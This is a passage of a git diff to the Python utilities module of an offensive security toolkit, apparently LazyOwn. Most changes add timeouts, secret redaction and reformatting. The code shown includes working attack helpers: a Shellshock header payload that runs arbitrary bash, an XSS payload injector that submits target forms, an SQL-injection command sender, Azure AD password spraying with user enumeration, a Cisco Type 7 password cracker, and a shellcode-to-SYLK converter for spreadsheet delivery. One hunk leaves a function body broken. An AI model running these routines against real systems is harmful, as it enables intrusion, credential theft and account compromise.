+                    "-sS",
+                    "--connect-timeout",
+                    "5",
+                    "--max-time",
+                    "12",
+                    f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={keyword_encoded}",
+                ],
+                capture_output=True,
+                text=True,
+                timeout=15,
+            )
+            if result.returncode == 0 and result.stdout.strip():
+                import json as _json
+
+                return _json.loads(result.stdout)
+            return False
+        except (_sp.TimeoutExpired, Exception):
+            return False
+    try:
+        resp = requests.get(
+            f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={keyword_encoded}", timeout=(3, 8)
+        )
+        if resp.status_code == 200:
+            return resp.json()
+        else:
+            return False
+    except requests.exceptions.Timeout:
+        print_error("NVD API request timed out")
         return False
+    except requests.exceptions.RequestException as exc:
+        print_error(f"NVD API request failed: {exc}")
+        return False
+
 
 def find_ea(keyword=""):
     """
@@ -952,14 +1106,37 @@ def find_ea(keyword=""):
     An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
     """
     keyword = f"{keyword}"
-    try:
-        resp = requests.get(f"https://www.exploitalert.com/api/search-exploit?name={keyword}")
-        if resp.status_code == 200:
-            return resp.json()
-        else:
-            return False
-    except:
+    import shutil as _shutil
+    import subprocess as _sp
+
+    curl = _shutil.which("curl")
+    if not curl:
         return False
+    try:
+        result = _sp.run(
+            [
+                curl,
+                "-sS",
+                "--connect-timeout",
+                "5",
+                "--max-time",
+                "8",
+                "-H",
+                "User-Agent: LazyOwn/1.0",
+                f"https://www.exploitalert.com/api/search-exploit?name={keyword}",
+            ],
+            capture_output=True,
+            text=True,
+            timeout=10,
+        )
+        if result.returncode == 0 and result.stdout.strip():
+            import json as _json
+
+            return _json.loads(result.stdout)
+        return False
+    except (_sp.TimeoutExpired, Exception):
+        return False
+
 
 def find_ps(keyword=""):
     """
@@ -979,11 +1156,19 @@ def find_ps(keyword=""):
     An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
     """
     keyword = f"{keyword}"
-    resp = requests.get(f"https://packetstormsecurity.com/search/?q={keyword}")
-    if resp.status_code == 200:
-        return resp.text
-    else:
+    try:
+        resp = requests.get(f"https://packetstormsecurity.com/search/?q={keyword}", timeout=(3, 7))
+        if resp.status_code == 200:
+            return resp.text
+        else:
+            return False
+    except requests.exceptions.Timeout:
+        print_error("PacketStorm API request timed out")
         return False
+    except requests.exceptions.RequestException as exc:
+        print_error(f"PacketStorm API request failed: {exc}")
+        return False
+
 
 def run(command):
     """
@@ -1008,24 +1193,41 @@ def run(command):
     Additional Notes:
     The function attempts to execute the provided command, capturing its output.
     It also handles common exceptions that may occur during command execution.
+    Secrets in the command line are redacted from console output.
     """
+    import re as _re
+
+    def _redact(text: object) -> str:
+        cleaned = str(text)
+        return _re.sub(r"(?i)(password|passwd|api[_-]?key|secret|token|ssapass)\s*[:=]\s*\S+", r"\1=***", cleaned)
+
     try:
-        print_msg(f"Attempting to execute: {command}")
-        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
-        print_msg(result)
+        print_msg(f"Attempting to execute: {_redact(command)}")
+        from core.safe_subprocess import SafeRunner
+
+        result = SafeRunner().run_shell(
+            command,
+            allow=True,
+            reason="legacy utils.run call site; requires opt-in at every invocation",
+        )
+        if result.returncode != 0:
+            print_error(f"Command failed with exit code {result.returncode}: {_redact(command)}")
+            return result.stderr or f"exit={result.returncode}"
+        print_msg(result.stdout)
         return result.stdout.strip()
     except FileNotFoundError as fnf_error:
-        print_error(f"Command not found: {command}")
+        print_error(f"Command not found: {_redact(command)}")
         return str(fnf_error)
     except subprocess.CalledProcessError as cpe_error:
-        print_error(f"Command failed with exit code {cpe_error.returncode}: {command}")
+        print_error(f"Command failed with exit code {cpe_error.returncode}: {_redact(command)}")
         return str(cpe_error)
     except subprocess.TimeoutExpired as te_error:
-        print_error(f"Command timed out: {command}")
+        print_error(f"Command timed out: {_redact(command)}")
         return str(te_error)
     except Exception as e:
         print_error(f"An unexpected error occurred: {str(e)}")
         return str(e)
+
 
 def is_exist(file):
     """Check if a file exists.
@@ -1055,6 +1257,7 @@ def is_exist(file):
         return False
     return True
 
+
 def get_domain(url):
     """
     Extracts the domain from a given URL.
@@ -1065,11 +1268,24 @@ def get_domain(url):
     Returns:
     str: The extracted domain from the URL, or None if it cannot be extracted.
     """
-    pattern = r'^(?:https?://)?(?:www\.)?([^/]+)'
+    pattern = r"^(?:https?://)?(?:www\.)?([^/]+)"
     match = re.search(pattern, url)
     if match:
         return match.group(1)
     return None
+
+
+def generate_random_cve_id():
+    """
+    Generate a random CVE identifier in the form CVE-{year}-{code}.
+
+    Returns:
+        str: A randomly generated CVE ID between 2020-2024 and 1000-9999.
+    """
+    year = random.randint(2020, 2024)
+    code = random.randint(1000, 9999)
+    return f"CVE-{year}-{code}"
+
 
 def generate_certificates():
     """
@@ -1086,33 +1302,73 @@ def generate_certificates():
 
         # Generate the CA certificate
         print_msg("Generating CA certificate...")
-        subprocess.run([
-            "sudo", "openssl", "req", "-x509", "-new", "-nodes", "-keyout", "ca_key.pem",
-            "-out", ca_cert_path, "-days", "365", "-subj", "/CN=SliverCA"
-        ], check=True)
+        subprocess.run(
+            [
+                "sudo",
+                "openssl",
+                "req",
+                "-x509",
+                "-new",
+                "-nodes",
+                "-keyout",
+                "ca_key.pem",
+                "-out",
+                ca_cert_path,
+                "-days",
+                "365",
+                "-subj",
+                "/CN=SliverCA",
+            ],
+            check=True,
+        )
 
         # Generate the client key
         print_msg("Generating client key...")
-        subprocess.run([
-            "sudo", "openssl", "genrsa", "-out", client_key_path, "2048"
-        ], check=True)
+        subprocess.run(["sudo", "openssl", "genrsa", "-out", client_key_path, "2048"], check=True)
 
         # Generate the client certificate signing request (CSR)
         print_msg("Generating client CSR...")
-        subprocess.run([
-            "sudo", "openssl", "req", "-new", "-key", client_key_path, "-out", "client_csr.pem",
-            "-subj", "/CN=SliverClient"
-        ], check=True)
+        subprocess.run(
+            [
+                "sudo",
+                "openssl",
+                "req",
+                "-new",
+                "-key",
+                client_key_path,
+                "-out",
+                "client_csr.pem",
+                "-subj",
+                "/CN=SliverClient",
+            ],
+            check=True,
+        )
 
         # Sign the client CSR with the CA key to create the client certificate
         print_msg("Generating client certificate...")
-        subprocess.run([
-            "sudo", "openssl", "x509", "-req", "-in", "client_csr.pem", "-CA", ca_cert_path,
-            "-CAkey", "ca_key.pem", "-CAcreateserial", "-out", client_cert_path,
-            "-days", "365"
-        ], check=True)
+        subprocess.run(
+            [
+                "sudo",
+                "openssl",
+                "x509",
+                "-req",
+                "-in",
+                "client_csr.pem",
+                "-CA",
+                ca_cert_path,
+                "-CAkey",
+                "ca_key.pem",
+                "-CAcreateserial",
+                "-out",
+                client_cert_path,
+                "-days",
+                "365",
+            ],
+            check=True,
+        )
 
         return ca_cert_path, client_cert_path, client_key_path
+
 
 def generate_emails(full_name, domain):
     """
@@ -1168,36 +1424,36 @@ def generate_emails(full_name, domain):
         f"{last_initial}{first_name}@{domain}",
         f"{last_initial}.{first_name}@{domain}",
         f"{last_initial}{first_initial}@{domain}",
-        f"{last_initial}.{first_initial}@{domain}"
+        f"{last_initial}.{first_initial}@{domain}",
     ]
 
     return permutations
+
+
 def clean_url(host):
     """Checks if the last character is a slash and removes it if so."""
-    if host.endswith('/'):
-        host = host.rstrip('/')
+    if host.endswith("/"):
+        host = host.rstrip("/")
     return host
+
 
 def random_string(length=15):
     """Generates a random alphanumeric string."""
     letters = string.ascii_letters + string.digits
-    return ''.join(random.choice(letters) for i in range(length))
+    return "".join(random.choice(letters) for i in range(length))
+
 
 def generate_http_req(host, port, uri, custom_header=None, cmd=None):
     """Generates an HTTP request with the Shellshock payload."""
     if cmd:
         payload = f'() {{ :;}}; echo; /bin/bash -c "{cmd}"'
     else:
-        random_string = random_string()
-        payload = f'() {{ :;}}; echo; echo "{random_string}"'
+        nonce = random_string()
+        payload = f'() {{ :;}}; echo; echo "{nonce}"'
 
     headers = {}
     if custom_header is None:
-        headers = {
-            'User-Agent': payload,
-            'Referer': payload,
-            'Cookie': payload
-        }
+        headers = {"User-Agent": payload, "Referer": payload, "Cookie": payload}
     else:
         headers[custom_header] = payload
 
@@ -1208,7 +1464,8 @@ def generate_http_req(host, port, uri, custom_header=None, cmd=None):
     if cmd:
         return response, None
     else:
-        return response, random_string
+        return response, nonce
+
 
 def format_openssh_key(raw_key):
     """
@@ -1234,12 +1491,13 @@ def format_openssh_key(raw_key):
     key_content = raw_key.replace(header, "").replace(footer, "").replace("\n", "").replace(" ", "").strip()
 
     # Split into 64-character lines
-    formatted_key_content = "\n".join([key_content[i:i+64] for i in range(0, len(key_content), 64)])
+    formatted_key_content = "\n".join([key_content[i : i + 64] for i in range(0, len(key_content), 64)])
 
     # Reassemble the key with the header and footer, and add necessary line breaks
     formatted_key = f"{header}\n{formatted_key_content}\n{footer}\n"
 
     return formatted_key
+
 
 def format_rsa_key(raw_key):
     """
@@ -1264,12 +1522,13 @@ def format_rsa_key(raw_key):
     key_content = raw_key.replace(header, "").replace(footer, "").replace("\n", "").replace(" ", "").strip()
 
     # Split into 64-character lines
-    formatted_key_content = "\n".join([key_content[i:i+64] for i in range(0, len(key_content), 64)])
+    formatted_key_content = "\n".join([key_content[i : i + 64] for i in range(0, len(key_content), 64)])
 
     # Reassemble the key with the header and footer, and add necessary line breaks
     formatted_key = f"{header}\n{formatted_key_content}\n{footer}\n"
 
     return formatted_key
+
 
 def is_package_installed(package_name):
     """
@@ -1280,6 +1539,7 @@ def is_package_installed(package_name):
     """
 
     return importlib.util.find_spec(package_name) is not None
+
 
 def extract(string, extract_flag):
     """
@@ -1304,6 +1564,7 @@ def extract(string, extract_flag):
     else:
         return string
 
+
 def clean_html(html_string):
     """
     Remove HTML tags from a string.
@@ -1313,59 +1574,10 @@ def clean_html(html_string):
     :param html_string: A string containing HTML content.
     :returns: A cleaned string with HTML tags removed.
     """
-    clean_pattern = re.compile(r'<.*?>')
-    cleaned_string = re.sub(clean_pattern, '', html_string)
+    clean_pattern = re.compile(r"<.*?>")
+    cleaned_string = re.sub(clean_pattern, "", html_string)
     return cleaned_string.strip()
 
-def run_command(command):
-    """
-    Run a command, print output in real-time, and store the output in a variable.
-
-    This method executes a given command using `subprocess.Popen`, streams both the standard
-    output and standard error to the console in real-time, and stores the full output (stdout
-    and stderr) in a variable. If interrupted, the process is terminated gracefully.
-
-    :param command: The command to be executed as a string.
-    :type command: str
-
-    :returns: The full output of the command (stdout and stderr).
-    :rtype: str
-
-    Example:
-        To execute a command, call `run_command("ls -l")`.
-    """
-
-    output = ""
-    command_tokens = shlex.split(command)
-    try:
-        process = subprocess.Popen(
-            command_tokens, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
-        )
-        while True:
-            stdout_line = process.stdout.readline()
-            if stdout_line:
-                sys.stdout.write(stdout_line)
-                output += stdout_line
-            stderr_line = process.stderr.readline()
-            if stderr_line:
-                sys.stdout.write(stderr_line)
-                output += stderr_line
-            if not stdout_line and not stderr_line and process.poll() is not None:
-                break
-        stdout, stderr = process.communicate()
-        if stdout:
-            sys.stdout.write(stdout)
-            output += stdout
-        if stderr:
-            sys.stdout.write(stderr)
-            output += stderr
-    except KeyboardInterrupt:
-        process.terminate()
-        print_warn("\n[Interrupted] Process terminated")
-        process.wait()
-    return output
-
-def generate_random_cve_id():
     """
     Generates a random CVE (Common Vulnerabilities and Exposures) ID.
 
@@ -1398,7 +1610,9 @@ def get_credentials(file=None, ncred=None):
     credential_files = glob.glob(f"{path}/sessions/credentials*.txt")
 
     if not credential_files:
-        print_error(f"No credential files found ({credential_files}). Please create one using: createcredentials admin:admin")
+        print_error(
+            f"No credential files found ({credential_files}). Please create one using: createcredentials admin:admin"
+        )
         return []
 
     if ncred is not None:
@@ -1421,7 +1635,7 @@ def get_credentials(file=None, ncred=None):
                 print_error("Invalid selection.")
                 return []
 
-    if file == True:
+    if file:
         return selected_file
 
     credentials = []
@@ -1432,6 +1646,7 @@ def get_credentials(file=None, ncred=None):
                 credentials.append((params[0], params[1]))
 
     return credentials
+
 
 def obfuscate_payload(payload):
     """
@@ -1457,6 +1672,7 @@ def obfuscate_payload(payload):
             obfuscated += f"\\x{hex(ord(c))[2:]}"
     return obfuscated
 
+
 def read_payloads(file_path):
     """
     Reads a file containing payloads and returns a list of properly formatted strings.
@@ -1472,11 +1688,12 @@ def read_payloads(file_path):
         list: A list of strings, each representing a payload from the file, formatted with
               leading and trailing double quotes if necessary.
     """
-    with open(file_path, 'r') as file:
+    with open(file_path, "r") as file:
         lines = file.readlines()
 
     payloads = [line.strip() if line.startswith('"') else f'"{line.strip()}"' for line in lines]
     return payloads
+
 
 def inject_payloads(urls, payload_url, request_timeout=15):
     """
@@ -1501,12 +1718,12 @@ def inject_payloads(urls, payload_url, request_timeout=15):
         requests.RequestException: Raises an exception if any HTTP request fails, which is handled
                                    by printing a warning message.
     """
-    payloads = read_payloads('modules/XssPayloads.txt')
+    payloads = read_payloads("modules/XssPayloads.txt")
 
     def send_request(raw_url):
         try:
-            if not raw_url.startswith(('http://', 'https://')):
-                raw_url = 'http://' + raw_url
+            if not raw_url.startswith(("http://", "https://")):
+                raw_url = "http://" + raw_url
             parsed_url = urllib.parse.urlparse(raw_url)
             query_params = urllib.parse.parse_qs(parsed_url.query)
 
@@ -1515,7 +1732,7 @@ def inject_payloads(urls, payload_url, request_timeout=15):
                     obfuscated_payload = obfuscate_payload(payload.format(payload_url))
                     full_url = f"{raw_url}?xss={obfuscated_payload}"
                     print_msg(f"[INFO] Sending request to {full_url}")
-                    resp = requests.get(full_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=request_timeout)
+                    resp = requests.get(full_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=request_timeout)
                     resp.raise_for_status()
                     handle_forms(resp.content, full_url)
                 return
@@ -1527,44 +1744,48 @@ def inject_payloads(urls, payload_url, request_timeout=15):
                     query_string = urllib.parse.urlencode(query_params, doseq=True)
                     full_url = f"{raw_url}{query_string}&xss={obfuscated_payload}"
                     print_msg(f"[INFO] Sending request to {full_url}")
-                    resp = requests.get(full_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=request_timeout)
+                    resp = requests.get(full_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=request_timeout)
                     resp.raise_for_status()
                     handle_forms(resp.content, full_url)
 
             updated_query = urllib.parse.urlencode(query_params, doseq=True)
             full_url = parsed_url._replace(query=updated_query).geturl()
             print_msg(f"[INFO] Sending request to {full_url}")
-            resp = requests.get(full_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=request_timeout)
+            resp = requests.get(full_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=request_timeout)
             resp.raise_for_status()
             handle_forms(resp.content, full_url)
         except requests.RequestException as e:
             print_warn(f"[WARN] Request failed for {raw_url}: {e}")
 
     def handle_forms(content, url):
-        soup = BeautifulSoup(content, 'html.parser')
-        forms = soup.find_all('form')
+        soup = BeautifulSoup(content, "html.parser")
+        forms = soup.find_all("form")
 
         if not forms:
             print_msg("[INFO] No forms found.")
             return
 
         for form in forms:
-            action = form.get('action', url)
-            if action.startswith('/'):
+            action = form.get("action", url)
+            if action.startswith("/"):
                 action = urllib.parse.urljoin(url, action)
 
-            method = form.get('method', 'GET').upper()
-            form_data = {input.get('name'): payloads[0].format(payload_url) for input in form.find_all('input') if input.get('name')}
+            method = form.get("method", "GET").upper()
+            form_data = {
+                input.get("name"): payloads[0].format(payload_url)
+                for input in form.find_all("input")
+                if input.get("name")
+            }
             if not form_data:
                 print_warn("[WARN] No input fields found in form.")
                 continue
-            urls_str = ''.join(urls)
+            urls_str = "".join(urls)
             action = f"http://{urls_str}/{action}"
             try:
-                if method == 'POST':
-                    resp = requests.post(action, data=form_data, headers={'User-Agent': 'Mozilla/5.0'})
+                if method == "POST":
+                    resp = requests.post(action, data=form_data, headers={"User-Agent": "Mozilla/5.0"})
                 else:
-                    resp = requests.get(action, params=form_data, headers={'User-Agent': 'Mozilla/5.0'})
+                    resp = requests.get(action, params=form_data, headers={"User-Agent": "Mozilla/5.0"})
 
                 print_msg(f"[INFO] Form submission response from {action}: {resp.status_code}")
             except requests.RequestException as e:
@@ -1573,50 +1794,13 @@ def inject_payloads(urls, payload_url, request_timeout=15):
     with ThreadPoolExecutor(max_workers=20) as executor:
         executor.map(send_request, urls)
 
+
 def prompt(label, default=None):
     """
     Return the prompt in the function do_xss
     """
     value = input(f"    {GREEN}{label}: ").strip()
     return value if value else default
-
-def is_lower(char):
-    """
-    Checks if a character is lowercase.
-
-    Parameters:
-        char (str): The character to check.
-
-    Returns:
-        bool: True if the character is lowercase, False otherwise.
-    """
-    return char.islower()
-
-
-def is_upper(char):
-    """
-    Checks if a character is uppercase.
-
-    Parameters:
-        char (str): The character to check.
-
-    Returns:
-        bool: True if the character is uppercase, False otherwise.
-    """
-    return char.isupper()
-
-
-def is_mixed(s):
-    """
-    Determines if a string contains both lowercase and uppercase characters.
-
-    Parameters:
-        s (str): The string to check.
-
-    Returns:
-        bool: True if the string has mixed casing, False otherwise.
-    """
-    return any(c.islower() for c in s) and any(c.isupper() for c in s)
 
 
 def add(str_part, delimiter, i):
@@ -1714,19 +1898,20 @@ def handle(input_str):
 
     return parts
 
-def get_users_dic(txt = None):
+
+def get_users_dic(txt=None):
     """
     List all .txt files in the 'sessions/' directory and prompt the user to select one by number.
 
     :returns: The path of the selected .txt file.
     """
-    path = os.path.join(os.getcwd(), 'sessions')
+    path = os.path.join(os.getcwd(), "sessions")
 
     if txt:
-        txt_files = [f for f in os.listdir(path) if f.endswith(f'.{txt}')]
+        txt_files = [f for f in os.listdir(path) if f.endswith(f".{txt}")]
     else:
         txt = "txt"
-        txt_files = [f for f in os.listdir(path) if f.endswith('.txt')]
+        txt_files = [f for f in os.listdir(path) if f.endswith(".txt")]
 
     if not txt_files:
         print_error(f"No .{txt} files found in 'sessions/' directory.")
@@ -1735,7 +1920,6 @@ def get_users_dic(txt = None):
     print_msg(f"Available .{txt} files:")
     for i, file in enumerate(txt_files):
         print_msg(f"    {i + 1}. {file}")
-
 
     try:
         choice = int(input(f"    [!] Choose a file by number (1-{len(txt_files)}): ").strip())
@@ -1749,7 +1933,8 @@ def get_users_dic(txt = None):
         print_warn("Invalid input. Please enter a number.")
         return None
 
-def get_hash(dir = None):
+
+def get_hash(dir=None):
     """
     Searches for hash files with the pattern 'hash*.txt' and allows the user to select one.
 
@@ -1779,7 +1964,7 @@ def get_hash(dir = None):
         return ""
 
     try:
-        if dir == True:
+        if dir:
             return selected_file
         else:
             with open(selected_file, "r") as file:
@@ -1788,6 +1973,7 @@ def get_hash(dir = None):
     except Exception as e:
         print_error(f"Failed to read the hash file: {str(e)}")
         return ""
+
 
 def is_digit(the_digit):
     """Check if the given character is a digit.
@@ -1798,7 +1984,8 @@ def is_digit(the_digit):
     Returns:
         bool: True if the character is a digit, False otherwise.
     """
-    return the_digit in '0123456789'
+    return the_digit in "0123456789"
+
 
 def crack_password(crypttext):
     """Crack a Cisco Type 7 password.
@@ -1810,7 +1997,7 @@ def crack_password(crypttext):
         str: The cracked plaintext password or an empty string if invalid.
     """
     crypttext = crypttext.upper()
-    plaintext = ''
+    plaintext = ""
     xlat = "dsfd;kfoA,.iyewrkldJKDHSUBsgvca69834ncxv9873254k;fg87"
     seed, val = 0, 0
 
@@ -1827,8 +2014,8 @@ def crack_password(crypttext):
 
         if is_digit(crypttext[i]):
             val += ord(crypttext[i]) - 0x30
-        elif 'A' <= crypttext[i] <= 'F':
-            val += ord(crypttext[i]) - ord('A') + 0x0A
+        elif "A" <= crypttext[i] <= "F":
+            val += ord(crypttext[i]) - ord("A") + 0x0A
         else:
             return ""
 
@@ -1839,6 +2026,7 @@ def crack_password(crypttext):
 
     return plaintext
 
+
 def get_terminal_size():
     try:
         size = os.get_terminal_size(sys.stdout.fileno())
@@ -1846,6 +2034,7 @@ def get_terminal_size():
     except Exception as e:
         print_error(f"Cannot get the size: {e}")
         return None, None
+
 
 def halp():
     """
@@ -1883,12 +2072,22 @@ def halp():
     print(f"    {YELLOW}Options:")
     print(f"    {GREEN}  --help             Show this help panel.")
     print(f"    {GREEN}  -v                 Show version.")
-    print(f"    {GREEN}  -p <payloadN.json> Exec with different payload.json example. ./run -p payload1.json, (Special for RedTeams)")
+    print(
+        f"    {GREEN}  -p <payloadN.json> Exec with different payload.json example. ./run -p payload1.json, (Special for RedTeams)"
+    )
     print(f"    {GREEN}  -c <command>       Exec a command using LazyOwn example: ping")
     print(f"    {GREEN}  --no-banner        No Banner{RESET}")
     print(f"    {GREEN}  -s                 Run as root {RESET}")
     print(f"    {GREEN}  --old-banner       Show old Banner{RESET}")
-    print(f"    {GREEN}  --no-logs          Turn of logs of commands in sessions directory. {RESET}")
+    print(f"    {GREEN}  --no-logs          Turn off logs of commands in sessions directory. {RESET}")
+    print(f"    {GREEN}  --headless         Non-interactive mode for CI/CD pipelines.{RESET}")
+    print(f"    {GREEN}  --json-output      Emit structured JSON per command (use with --headless).{RESET}")
+    print(f"    {GREEN}  --profile <file>   YAML profile overriding payload.json keys.{RESET}")
+    print(f'    {GREEN}  --run-chain <cmds> Semicolon-separated command chain (e.g. "scan; enum").{RESET}')
+    print("")
+    print(f"    {CYAN}Headless examples:{RESET}")
+    print(f'    {WHITE}  ./run --headless --json-output -c "nmap_scan"{RESET}')
+    print(f'    {WHITE}  ./run --headless --profile ops.yaml --run-chain "recon; enum; exploit"{RESET}')
     sys.exit(0)
 
 
@@ -1919,16 +2118,14 @@ def ensure_tmux_session(session_name):
         - The command executed within the tmux session must be valid and
           accessible in the current environment.
     """
-    result = subprocess.run(
-        ["tmux", "has-session", "-t", session_name],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE
-    )
+    result = subprocess.run(["tmux", "has-session", "-t", session_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     if result.returncode != 0:
-        command = f"tmux has-session -t '{session_name}' 2>/dev/null || tmux new-session -d -s '{session_name}' './run --no-banner' && tmux attach -t '{session_name}'"
-        print_msg(command)
-        os.system(command)
+        q = shlex.quote(session_name)
+        subprocess.run(["tmux", "has-session", "-t", session_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        subprocess.run(["tmux", "new-session", "-d", "-s", session_name, "./run --no-banner"], check=False)
+        subprocess.run(["tmux", "attach", "-t", session_name], check=False)
+
 
 def get_xml(directory):
     """
@@ -1942,6 +2139,7 @@ def get_xml(directory):
     """
     return [file for file in os.listdir(directory) if file.endswith(".xml")]
 
+
 def get_domain_from_xml(xml_file):
     """
     Extracts the first domain or IP address from an Nmap scan XML file.
@@ -1952,7 +2150,7 @@ def get_domain_from_xml(xml_file):
         print(f"[!] The XML file '{xml_file}' does not exist.")
         return None
 
-    with open(xml_file, 'r') as file:
+    with open(xml_file, "r") as file:
         xml_content = file.read()
 
     ip_match = re.search(r'<address addr="([\d\.]+)"', xml_content)
@@ -1971,29 +2169,30 @@ def get_domain_from_xml(xml_file):
 
     return domain
 
+
 def shellcode_to_sylk(shellcode_path):
 
-	sylk_output = SYLK_TEMPLATE
+    sylk_output = SYLK_TEMPLATE
 
-	charinline = 0
-	cell = 1
+    charinline = 0
+    cell = 1
 
-	with open(shellcode_path, "rb") as f:
-		byte = f.read(1)
-		while byte != b"":
-			if charinline == 0:
-				sylk_output += ("C;X2;Y%s;E" % (str(cell)))
-				cell += 1
-			else:
-				sylk_output+=("&")
-			sylk_output += ("CHAR(" + str(ord(byte)) + ")")
-			byte = f.read(1)
-			charinline += 1
-			if charinline == 20:
-				sylk_output += ("\n")
-				charinline = 0
-	sylk_output+=("\nC;X2;Y%s;K0;ERETURN()\nE\n" % (str(cell)))
-	return sylk_output
+    with open(shellcode_path, "rb") as f:
+        byte = f.read(1)
+        while byte != b"":
+            if charinline == 0:
+                sylk_output += "C;X2;Y%s;E" % (str(cell))
+                cell += 1
+            else:
+                sylk_output += "&"
+            sylk_output += "CHAR(" + str(ord(byte)) + ")"
+            byte = f.read(1)
+            charinline += 1
+            if charinline == 20:
+                sylk_output += "\n"
+                charinline = 0
+    sylk_output += "\nC;X2;Y%s;K0;ERETURN()\nE\n" % (str(cell))
+    return sylk_output
 
 
 def get_banner(ip, port):
@@ -2001,7 +2200,7 @@ def get_banner(ip, port):
         s.settimeout(2)
         try:
             s.connect((ip, int(port)))
-            s.sendall(b'\n')
+            s.sendall(b"\n")
             banner = s.recv(1024)
             return banner.decode().strip()
 
@@ -2012,7 +2211,8 @@ def get_banner(ip, port):
         except Exception as e:
             return f"Error: {str(e)}"
 
-def list_binaries(directory='sessions'):
+
+def list_binaries(directory="sessions"):
     """
     List all executable binaries in the specified directory.
 
@@ -2030,6 +2230,7 @@ def list_binaries(directory='sessions'):
                 binaries.append(file_path)
 
     return binaries
+
 
 def select_binary(binaries):
     """
@@ -2055,6 +2256,7 @@ def select_binary(binaries):
         except ValueError:
             print_error("Please enter a number.")
 
+
 def decode(data):
     """
     Decodes base64 data received from the server output.
@@ -2068,19 +2270,21 @@ def decode(data):
     parser = HTMLParser()
     try:
         decoded_data = base64.b64decode(data)
-    except:
-        return '[-] Decoding error'
-    return decoded_data.decode('utf-8', errors='ignore')
+    except Exception:
+        return "[-] Decoding error"
+    return decoded_data.decode("utf-8", errors="ignore")
+
 
 def get_command(url, lhost):
     """
     Reads a command from standard input and initiates a thread to send the command to the target server.
     """
     try:
-        cmd = input('    :\\> ')
-        threading.Thread(target=send_command, args=(cmd,url,lhost)).start()
-    except:
+        cmd = input("    :\\> ")
+        threading.Thread(target=send_command, args=(cmd, url, lhost)).start()
+    except (EOFError, KeyboardInterrupt):
         sys.exit(0)
+
 
 def send_command(cmd, url, lhost):
     """
@@ -2100,14 +2304,15 @@ def send_command(cmd, url, lhost):
     payload += "--"
 
     login = {
-        'B1': 'LogIn',
-        'logintype': payload % cmd,
-        'username': "admin",
-        'rememberme': 'ON',
-        'password': "admin",
+        "B1": "LogIn",
+        "logintype": payload % cmd,
+        "username": "admin",
+        "rememberme": "ON",
+        "password": "admin",
     }
 
     requests.post(url, data=login)
+
 
 def activate_server(httpd, url, lhost):
     """
@@ -2119,66 +2324,68 @@ def activate_server(httpd, url, lhost):
     get_command(url, lhost)
     httpd.server_activate()
 
+
 def Spray(domain, users, password, target_url, wait, verbose, more_verbose):
 
-	results = []
+    results = []
 
-	AD_codes = detailed_codes.keys()
+    AD_codes = detailed_codes.keys()
 
-	if verbose or more_verbose:
-		print("Targeting: " + target_url + "\n")
+    if verbose or more_verbose:
+        print("Targeting: " + target_url + "\n")
 
-	headers = {'Content-Type':'text/xml'}
+    headers = {"Content-Type": "text/xml"}
 
-	for user in users:
-		if more_verbose:
-			print("\ntesting " + user)
-		xml_data = xml_body.substitute(username=user, domain=domain, password=password)
-		r = requests.post(target_url, data=xml_data)
+    for user in users:
+        if more_verbose:
+            print("\ntesting " + user)
+        xml_data = xml_body.substitute(username=user, domain=domain, password=password)
+        r = requests.post(target_url, data=xml_data)
 
-		if more_verbose:
-			print("Status: " + str(r.status_code))
+        if more_verbose:
+            print("Status: " + str(r.status_code))
 
-		if 'ThrottleStatus' in r.headers.keys():
-			print("Throttling detected => ThrottleStatus: " + r.headers('ThrottleStatus'))
+        if "ThrottleStatus" in r.headers.keys():
+            print("Throttling detected => ThrottleStatus: " + r.headers("ThrottleStatus"))
 
-		if 'IfExistsResult' in r.content.decode('UTF-8'):
-			print(r.content)
-			sys.exit()
+        if "IfExistsResult" in r.content.decode("UTF-8"):
+            print(r.content)
+            sys.exit()
 
-		if r.status_code == 200:
-			results.append([user + '@' + domain, 'Success', password])
-			if verbose:
-				print(user + "@" + domain + "\t\t:: " + password)
-			continue
+        if r.status_code == 200:
+            results.append([user + "@" + domain, "Success", password])
+            if verbose:
+                print(user + "@" + domain + "\t\t:: success")
+            continue
 
-		for code in AD_codes:
-			if code in r.content.decode('UTF-8'):
-				if code == 'AADSTS50034':
-					results.append([user + "@" + domain, code, 'NOUSER'])
-				else:
-					results.append([user + "@" + domain, code, 'User Exists'])
-				if more_verbose:
-					print("\n" + user + "@" + domain + "\t\t:: " + detailed_codes[code])
-				break
-		time.sleep(wait)
+        for code in AD_codes:
+            if code in r.content.decode("UTF-8"):
+                if code == "AADSTS50034":
+                    results.append([user + "@" + domain, code, "NOUSER"])
+                else:
+                    results.append([user + "@" + domain, code, "User Exists"])
+                if more_verbose:
+                    print("\n" + user + "@" + domain + "\t\t:: " + detailed_codes[code])
+                break
+        time.sleep(wait)
 
-	return results
+    return results
 
 
 def ProcessResults(results, outfile):
 
-	for result in results:
-		if result[1] == 'Success':
-			outfile.write(result[0] + "\t\t:: " + result[1] + "\n")
-		else:
-			continue
+    for result in results:
+        if result[1] == "Success":
+            outfile.write(result[0] + "\t\t:: " + result[1] + "\n")
+        else:
+            continue
 
-	for result in results:
-		if result[1] == 'Success':
-			continue
-		else:
-			outfile.write(result[0] + "\t\t-- " + result[1] + " -- " + detailed_codes[result[1]] + "\n")
+    for result in results:
+        if result[1] == "Success":
+            continue
+        else:
+            outfile.write(result[0] + "\t\t-- " + result[1] + " -- " + detailed_codes[result[1]] + "\n")
+
 
 def generate_index(repo_dir):
     """
@@ -2190,31 +2397,25 @@ def generate_index(repo_dir):
     Returns:
     None
     """
-    dists_dir = os.path.join(repo_dir, 'dists/kali-rolling/main/binary-amd64')
+    dists_dir = os.path.join(repo_dir, "dists/kali-rolling/main/binary-amd64")
     os.makedirs(dists_dir, exist_ok=True)
 
-    pool_dir = os.path.join(repo_dir, 'pool/main')
